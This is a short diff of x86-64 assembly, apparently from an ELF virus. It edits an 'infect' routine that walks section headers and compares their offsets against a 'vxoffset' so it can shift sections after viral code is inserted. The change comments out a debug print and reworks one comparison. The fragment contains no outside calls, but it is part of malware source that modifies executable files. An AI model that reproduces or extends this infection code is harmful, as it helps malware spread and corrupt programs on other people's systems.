@@ -978,14 +978,16 @@ infect:
 	mov word cx, [r13 + 60]											; elf_ehdr.e_shnum
 
 	check_shdrs:
-		mov rdx, checkshdrstartlen
-		lea rsi, checkshdrstart
-		mov rdi, STDOUT
-		mov rax, SYS_WRITE
-		syscall
+		;mov rdx, checkshdrstartlen
+		;lea rsi, checkshdrstart
+		;mov rdi, STDOUT
+		;mov rax, SYS_WRITE
+		;syscall
 		.shdr_loop:
 			push rcx
-			cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
+			mov r11, [r13 + r15 + elf_shdr.sh_offset]
+			;cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
+			cmp dword r11d, vxoffset
 			jge .mod_subsequent_shdr
 			mov rdx, modvxshdrpass0len
 			lea rsi, modvxshdrpass0
